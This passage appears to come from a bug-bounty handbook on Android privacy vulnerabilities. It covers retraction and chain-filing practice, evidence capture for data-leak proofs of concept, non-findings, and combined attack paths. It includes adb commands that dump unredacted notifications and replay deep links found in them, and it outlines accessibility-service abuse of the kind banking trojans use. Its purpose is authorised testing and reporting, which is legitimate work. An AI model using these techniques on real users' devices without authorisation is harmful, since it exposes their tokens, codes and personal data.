- **Test:** Privacy findings are unusually prone to mid-engagement change: an SDK is remotely reconfigured, a
  feature flag flips, a consent default is updated server-side. Two opposite rules apply and the difference
  is whether you hold pre-change evidence.
- **How:** When a claimed finding fails reproduction and you have **no** pre-change evidence, retract it in
  an appendix rather than silently dropping it:
```markdown
### Retracted: <finding name>
- **Original signal:** <what looked like a bug>
- **Disproving evidence:** <reproduction step + observation that disproves it>
- **Why it looked like a bug:** <root cause of the FP — marker collision, jitter, status-code-only confidence>
- **Retraction date:** <YYYY-MM-DD>
```
  When a **confirmed** finding stops reproducing and you hold timestamped pre-patch evidence, **do not
  retract it** — assume the client patched. Keep the finding with the timestamped capture, and note the
  detection timeline itself as an observation about the client's response capability. A clean report with a
  retraction appendix is more trustworthy than a longer one where findings fall apart at triage; a
  self-retraction reads as a researcher who validates their own work.
- **Proof:** The appendix entry, or the timestamped pre-change capture.
- **Escalation:** Retract pre-emptively if a submitted finding stops reproducing within 24 hours —
  self-retraction does not hit the same platform-tracked metric a triager retraction does.
- **Ruled out when:** n/a — governance.

### D20-069 · Chain-filing order for privacy primitives — file the primitive, then the consumer

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — submission mechanics |
| **Attacker** | n/a |
| **Applies to** | every multi-finding engagement; D20 produces primitives more often than consumers |
| **Maps to** | `bugcrowd-reporting` §5 (chain filing) and §8 (submission-order strategy) |

- **Test:** Almost everything in this chapter is a primitive whose severity comes from a consumer in another
  domain: the logged token (consumer: D13 session replay), the notification OTP (consumer: D13 2FA bypass),
  the accessibility-readable confirmation screen (consumer: D13/D23 automated transaction). File in the order
  that lets you reference real identifiers.
- **How:** (1) Identify the highest-severity chained outcome. (2) File each primitive as a separate report at
  its honest standalone severity — typically P4/P5 here — leaving a placeholder cross-reference line.
  (3) File the chain consumer with the full narrative at the chained severity, filling in the real primitive
  IDs. (4) Edit each primitive to backfill the consumer's ID. The consumer body carries:
```markdown
## Chain partners (filed as separate reports)
- **submission [UUID-1]** — [primitive 1: e.g. session token written to logcat]
- **submission [UUID-2]** — [primitive 2: e.g. OEM package holding READ_LOGS on the supported device set]
These primitives have independent fix surfaces and are filed separately per the programme's
"one fix = one bounty" rule.
```
  **Do not** paste the whole chain narrative into every primitive, claim each primitive is independently P1,
  or ask for a single combined bounty — a chain is a **severity amplifier, not a merge request**. And do not
  file everything within minutes of each other: triagers read a simultaneous batch as low-effort spam.
- **Proof:** Cross-referenced IDs in both directions.
- **Escalation:** n/a.
- **Ruled out when:** n/a — mechanics.

### D20-070 · The five-screenshot pattern adapted to a data-leak PoC

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — evidence |
| **Attacker** | n/a |
| **Applies to** | every D20 finding with a demonstrated consumer |
| **Maps to** | `evidence-hygiene` §7 (the five-screenshot state-change pattern); MHL's quantified-exfiltration reporting standard |

- **Test:** A leak PoC needs the same five-shot discipline as a state change, remapped: (1) **pre-state** —
  the value inside the app, shown as the user sees it, with your marker visible; (2) **the leak itself** —
  the capture, log line, notification dump or request body containing that same marker, from the consumer's
  side; (3) **negative control** — the same capture taken *before* the value existed, or from an app/account
  that should not see it, showing the marker absent; (4) **positive post-state** — the value used, e.g. the
  token replayed against the API returning the victim's data, or the OTP completing the login;
  (5) **side effect** — whether the app or the backend noticed: a notification email, a session-list entry,
  an audit-log line, or their absence.
- **How:** Name files `{finding-#}-step{n}-{description}.png` (`04-step2-notification-listener-otp.png`) and
  reference them by filename in the body. Take all five in one sitting — reloading regenerates cookies and
  invalidates the earlier captures. Quantify rather than describe: MHL's report-ready lines are the standard
  to match — *"Call returned 679091 bytes / Found 63 PNG image(s) in protobuf / Permissions used: NONE"*, and
  for a contacts exfil, *"EXFILTRATED name #1..3 / EXFILTRATED phone #1..3 … all of the above was read
  WITHOUT READ_CONTACTS"*.
- **Proof:** Five numbered, cross-referenced artefacts, with counts and byte totals instead of adjectives,
  and the attacker app's permission set stated explicitly (ideally empty) — triagers look for that line.
- **Escalation:** Pair with D20-006 (the PII mask/leave-visible split) before attaching anything, and with
  D20-005 (redact at capture time). For a Critical or High claim, reproduce with a second tool as well: the
  same leak shown through both a Frida hook and an independent capture is much harder to argue with.
- **Ruled out when:** n/a — evidence.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "The app writes to logcat" / `Log.d` calls present in the release build | `READ_LOGS` has been `signature\|privileged` since API 16 and API 30+ adds a consent dialog; Google's Mobile VRP excludes logging by name ("debugging privileges are required to access logs"). The mechanism has no rated node. | A **sensitive value** in the line, plus a named reader: a shipped package holding `READ_LOGS`, a debuggable build, or an SDK that forwards the buffer off-device (D20-008, D20-016). |
| Debug stack trace or verbose error in logcat | HackenProof: "Debug Logs / Stack Traces — unless they expose sensitive data like credentials or tokens". `StrictMode` output is a resilience artefact. | The trace containing a credential, an internal endpoint you can then reach, or a framework version with a working exploit (D20-013, D20-014). |
| Missing `FLAG_SECURE` / Recents thumbnail shows the screen | `insecure_data_storage.screen_caching_enabled` is **P5** outright and Bugcrowd's remediation text calls the fix "a best practice". A root read of `/data/system_ce/0/snapshots` is AM-12, which is not an attack. | A named consumer that captures it (a MediaProjection holder, an in-process SDK capture that `FLAG_SECURE` cannot stop, a remote screen-share viewer), plus a data class worth capturing (D20-017, D20-018, D20-037, D20-038). |
| "Clipboard is enabled" / a Copy button exists on a sensitive field | `mobile_security_misconfiguration.clipboard_enabled` is **P5**; the finer children `on_sensitive_content` / `on_non_sensitive_content` were **removed** and the parent pinned at P5 "due to children removal" — Bugcrowd will not entertain a sensitivity argument on category grounds. | A cross-app read demonstrated from a different UID in the foreground, of an OTP or recovery phrase, that persists in keyboard clipboard history after the app closes (D20-043, D20-044). |
| "A background app can read the clipboard" | Dead since **Android 10 (API 29)** — foreground or default-IME only, and Android 12 shows an access toast. Claiming it is a fast N/A. | Demonstrate the foreground or IME read, and describe the platform mitigation honestly (D20-044). |
| Keyboard cache / autocomplete enabled on a password field | `external_behavior.browser_feature.autocomplete_enabled` and `…autocorrect_enabled` are **P5**; "autocomplete on password fields" is on the never-submit list. | The cached value being a full PAN, password or recovery phrase, shown surfacing in a **different** app's suggestion strip (D20-046). |
| Password or token found in process memory | `external_behavior.user_password_persisted_in_memory` is **P5** and requires local code execution to reach. | Only as the second half of a chain whose first half is root, a debuggable build, or a native bug — and even then it raises another finding's impact rather than standing alone (see D11-066). |
| "The API returns more fields than necessary" | An explicitly named anti-pattern: field count is not a finding. | Name the field and why it is sensitive — recovery codes, a password hash, an auth token, another user's identifier (D20-027). |
| EXIF not stripped from my own uploaded photo | Basecamp lists it out of scope; HackenProof excludes image metadata "unless they expose sensitive user information"; Google requires location to be "combined with the ability to uniquely identify an individual". There is **no rated VRT node** without the user-enumeration qualifier. | Fetch the original as a **different** account, recover the GPS, and tie it to an identifiable person (D20-058). |
| The app collects an advertising ID | Expected and declared behaviour; H1 #803941 paid **$0**. | The advertising ID transmitted in the same payload as a persistent identifier, correlated across two third-party destinations, or sent after opt-out (D20-053). |
| The app can enumerate installed packages | Google Mobile VRP, Intended Behavior: *"the ability of an application to tell which versions of which apps are installed is intended functionality of the Android platform which we do not consider a vulnerability"*. | The list transmitted to a third party as a tracking signal, with `QUERY_ALL_PACKAGES` declared and no feature that needs it (D20-056). |
| My PoC app read the data — while holding the matching permission | Xiaomi excludes "any data leak because the malicious APP has acquired the appropriate permissions". A permission-holding PoC demonstrates the permission, not a flaw. | A **zero-permission** PoC obtaining the data, or a permission boundary being bypassed. State your PoC's permission set (ideally empty) in the report — triagers look for it. |
| Location data collected | "Location information alone does not qualify (unless combined with the ability to uniquely identify an individual)." | Location joined to an identity, or precise location broadcast to any installed app (H1 #185862, Twitter, is the shape). |
| "This violates GDPR / the privacy policy" | Intigriti's standard rejects *"functional bugs or process flaws resulting in compliance, privacy and governance issues that do not pose an immediate and exploitable threat"*. An argument is not evidence. | A captured payload showing a named data type reaching a named unauthorised recipient, with the declaration that omits it (D20-025). The regulation is the framing, never the finding. |
| Session not invalidated on logout (client side only) | `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout_server_side_only` is **P5**; "session not invalidated on logout" is on the never-submit list. | The old token returning 200 with the victim's data after logout **or after account deletion** — which is D13's report, not this chapter's (D20-062). |
| `allowBackup="true"` in the manifest | `mobile_security_misconfiguration.auto_backup_allowed_by_default` is **P5**; H1 #1225158 (Zivver) paid **$0**. `adb backup` is LEGACY from API 31. | A restored device opening into an authenticated session, demonstrated through Auto Backup / device transfer, not `adb backup` (D20-063, D11-051 to D11-058). |
| A third-party SDK exists in the app | Presence is not collection. | A captured payload from that SDK's host carrying user data, attributed to the SDK by stack trace, and absent from the Data safety declaration (D20-019, D20-025). |

## Cross-surface joins

- **Notification extras × the deep-link router (D20-031 × D09).** A `NotificationListenerService` reads the
  notification's `contentIntent` and its extras, then **replays the deep link itself** — often carrying a
  one-time token or an object id lifted straight out of the notification. Nobody reviews the notification
  payload and the URL router together, because one is a UI concern and the other is a routing concern.
  `adb shell dumpsys notification --noredact | grep -iE 'contentIntent|Intent\{'`, then
  `am start -a android.intent.action.VIEW -d '<the url you found>'` and see whether it yields authenticated
  content. Notification access — a single user toggle — becomes authenticated app access.
- **Session-replay or crash SDK × the app's own `FLAG_SECURE` policy (D20-017/D20-018 × D04-042).** The
  security team sets `FLAG_SECURE` on the card screen and signs it off; the growth team adds a replay SDK
  that captures the view hierarchy **in-process**, where `FLAG_SECURE` has no effect. The two changes are
  reviewed by different people and the join is invisible in either diff. Test by crashing on the secure
  screen with the proxy up, then carving any PNG out of the upload body.
- **Crash reporter × logcat (D20-016 × D20-008).** The logcat finding is P5 because nobody can read the
  buffer — until the crash SDK attaches the last N log lines to every report. One configuration flag
  converts an excluded-by-Google hygiene note into a cross-boundary disclosure with a named recipient. Grep
  for `enableLogcat` / `attachLogs` / breadcrumb configuration, then force a crash after the token appears.
- **EXIF × the user-search oracle (D20-058 × D15).** A listing photo's GPS is "a location". The same GPS,
  joined to a user-search endpoint that resolves a handle to a real name and phone, is "this named person's
  home address". Neither half is reportable alone; the join satisfies the VRT's *user enumeration* qualifier
  and reaches P3.
- **Accessibility readability × an unbound biometric gate (D20-050 × D13).** A service with
  `canRetrieveWindowContent` reads the transfer-confirmation screen, and with `canPerformGestures`
  dispatches the tap. If `BiometricPrompt` gates a boolean rather than a `CryptoObject` bound to the
  transaction, "the user must confirm with biometrics" becomes fully automatable. This is the mechanism of
  the current Android banking-trojan generation, and the two halves live in different chapters.
- **Backup restore × account deletion (D20-063 × D20-061).** The account is deleted server-side; the device
  transfer or cloud restore then re-materialises the local cache — messages, cached profile, KYC images — on
  a **new** device, after deletion. Nobody tests deletion and restore in the same pass because one is a
  server concern and the other a device concern.
- **Consent toggles × SDK-injected permissions (D20-020 × D03/D18).** A permission appears in the merged
  manifest that no app feature uses; the SDK that injected it also ignores the consent flag. Separately each
  is a shrug; together they are "the app requests a dangerous permission solely so a third party can collect
  under it, and the user's refusal changes nothing".
- **IME field marking × the deliberately non-password OTP field (D20-046/D20-047 × D13).** Apps make OTP and
  CVV fields plain numeric **on purpose**, so the digits are visible and paste works. That decision removes
  the IME's personalisation protection at the same time. The usability choice and the keyboard-learning
  consequence are never reviewed together.
- **Photo-picker scope × EXIF egress (D20-059 × D20-058).** A full `READ_MEDIA_IMAGES` grant plus an
  unstripped upload pipeline means the app can enumerate and ship metadata for images the user never chose.
  Either alone is Low; together it is bulk location history the user believes they never shared.
- **Shadow API × telemetry (D20-025 × D15/D01).** The mobile client's hardcoded analytics or profile
  endpoint is frequently an **older** API version than the web app uses — with weaker auth, weaker rate
  limits and **more field exposure**, which is precisely what makes it a privacy finding as well as an
  access-control one. Diff the two versions **behaviourally**, not by response shape: a version difference
  alone is Informational, the weakened control is the finding.
- **Lock-screen OTP × SIM-swap or device theft (D20-030 × D13).** A physical attacker holding a locked phone
  who can read the OTP from the keyguard does not need the password *and* the second factor — the second
  factor is on the screen. The notification setting and the account-recovery design are owned by different
  teams and never tested as one path.

## Sources

- **OWASP MASTG / MASVS / MASWE** — MASTG-TEST-0203, -0206, -0231, -0254 to -0258, -0263 to -0265, -0289,
  -0291 to -0294, -0315, -0316, -0318, -0319, -0320 and the deprecated v1 predecessors -0003, -0005, -0006,
  -0008, -0010, -0041; MASTG-TECH-0002/0009/0010/0022/0043/0100/0142; MASTG-KNOW-0009/0049/0053/0054/0055;
  MASTG-BEST-0002/0014/0019/0027; MASTG-TOOL-0001/0015/0029/0077/0079/0081/0097/0106/0112;
  MASWE-0005/0019/0025/0030/0036/0037/0038/0040/0050/0061/0067/0068/0073/0074; the semgrep rules
  `mastg-android-sensitive-data-in-notifications`, `…-manifest`, `mastg-android-sensitive-data-in-screenshot`,
  `mastg-android-input-field-usage`, `mastg-android-keyboard-cache-input-types`, `mastg-android-strictmode`.
- **Bugcrowd VRT release 2026-07-08** (581 entries) — the P5 pinning of `insecure_data_storage.screen_caching_enabled`,
  `mobile_security_misconfiguration.clipboard_enabled`, `external_behavior.browser_feature.*` and
  `external_behavior.user_password_persisted_in_memory`; the null-priority `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure`
  and `privacy_concerns.unnecessary_data_collection`; the P3/P4 EXIF nodes and their user-enumeration
  qualifier; the changelog note that the clipboard children were removed and the parent set to P5.
- **HackerOne Platform Standards** — the multi-user sensitive-PII → Critical rule, the enumerated PII list,
  the "stop testing and report" instruction, and the clarification that data deletion belongs under Integrity
  with `A:N`. **Google Mobile VRP** Invalid Reports (logging, intended-behaviour package enumeration,
  location-alone exclusion) and its Low/High Impact Data definitions. **Intigriti** triage standards on
  compliance-shaped findings. **Xiaomi** out-of-scope clause on permission-holding PoC apps. **Basecamp**
  and **HackenProof** EXIF/metadata exclusions.
- **Disclosed reports** — H1 #56002 (Shopify, full request/response logging), #462416 (Grammarly keyboard,
  Low/$0), #5314 (Coinbase, OAuth code in logcat chained to a hardcoded client secret), #803941 (NordVPN,
  advertising ID, $0), #185862 (Twitter, location to any installed app), #472013 and #519059 (Twitter,
  privacy setting silently overridden by the Android app), #23913 (Twitter iOS, DMs surviving logout),
  #377582 (VK, cache DB), #1167916/#1167919 (Nextcloud, default-on vendor lookup), #1225158 (Zivver,
  allowBackup, $0), and the Mail.ru notification-centre email read ($10,000).
- **MITRE ATT&CK Mobile** — T1414 and T1641.001 (clipboard, both directions), T1513 and T1453 (screen
  capture), T1517 and T1644 (notification access and out-of-band data), T1636.001–.005 (protected user data),
  T1533, T1430, T1429, T1512, T1532, T1541, T1628 and T1628.002, T1646 — with the software examples the
  corpus quotes verbatim (BRATA, BusyGasper, Crocodilus, Escobar, SharkBot, Hornbill, S.O.V.A., Exodus).
- **AOSP and Android developer documentation** — `source.android.com/docs/core/permissions/immutable-device-ids`;
  the AOSP security-model paper's threat model ([T.A5], [T.D1], [T.P3], [T.P4]) and its Tables 3 and 6 on MAC
  randomisation and `/proc`,`/sys` restrictions; `guide/topics/data/audit-access` (`OnOpNotedCallback`);
  `develop/ui/views/notifications/build-notification`; `reference/.../NotificationListenerService`;
  `identity/autofill/autofill-services` and `guide/topics/text/autofill-services`;
  `guide/topics/ui/accessibility/service`; `media/grow/media-projection`;
  `about/versions/12/behavior-changes-all` and `-12`; `about/versions/14/behavior-changes-14` and
  `features/screenshot-detection`; `about/versions/15/behavior-changes-all` and `features`;
  `privacy-and-security/risks/{log-info-disclosure,secure-clipboard-handling}`; `develop/ui/views/touch-and-input/copy-paste`;
  `develop/background-work/services/fgs/service-types`; the AOSP `EditorInfo` javadoc for
  `IME_FLAG_NO_PERSONALIZED_LEARNING`.
- **Tooling and scanner corpora** — objection (`android clipboard monitor`), drozer-modules
  (`metall0id/post/{clipboard,contacts,sms,location,microphone,call}.py`), pidcat, mitmproxy/Burp/ZAP,
  Frida hook patterns for `Log`, `PrintStream`, `ClipboardManager`, `Notification.Builder`, `AudioRecord`,
  `GZIPOutputStream`, `okhttp3.Request$Builder` and `AppOpsManager$OnOpNotedCallback`; mobsfscan
  (`android_logging`, `android_kotlin_logging`, `android_sensitive_notification`), MobSF API rules
  (`api_get_device`, `api_get_subscriber`, `api_get_sim_serial`, `api_get_advertising`, `api_get_wifi`,
  `api_installed`, `api_sms_call`), QARK (`file/android_logging.py`, `file/phone_identifier.py`),
  mindedsecurity (`MSTG-STORAGE-3`, `MSTG-PLATFORM-8_2`).
- **Community and research corpora** — HackTricks (`inputmethodservice-ime-abuse.md`,
  `accessibility-services-abuse.md`, tapjacking, "Background Images"), hackwithsingh sec-14-* checklists,
  riya78, Indusface, sehno, Gowthams, Het Mehta, sec-88, iamsarvagyaa/AndroidSecNotes, Doyensec's
  "One Bug To Rule Them All: Modern Android Password Managers and FLAG_SECURE Misuse", Oversecured's SDK and
  banking research, Mobile Hacking Lab's quantified-exfiltration reporting standard (CVE-2026-0047 PoC
  output), Capacitor `MessageHandler.java` / `CapConfig.java`, NIST SP 800-115 Appendix B §§5.3 and 6.6.
- **The bug-hunting corpus** — the reader/consumer discipline, Marker Discipline (8+ character markers and
  the baseline check), the Body-Diff Rule applied to the consent-off differential, the Shell-Loop Ban and
  result counting, the Pre-Severity Gate run against the Critical claim, retraction discipline and its
  inverse, the PII mask/leave-visible split, the five-screenshot pattern, HAR sanitising, the
  severity-request paragraph, chain-filing order, and the never-submit list.
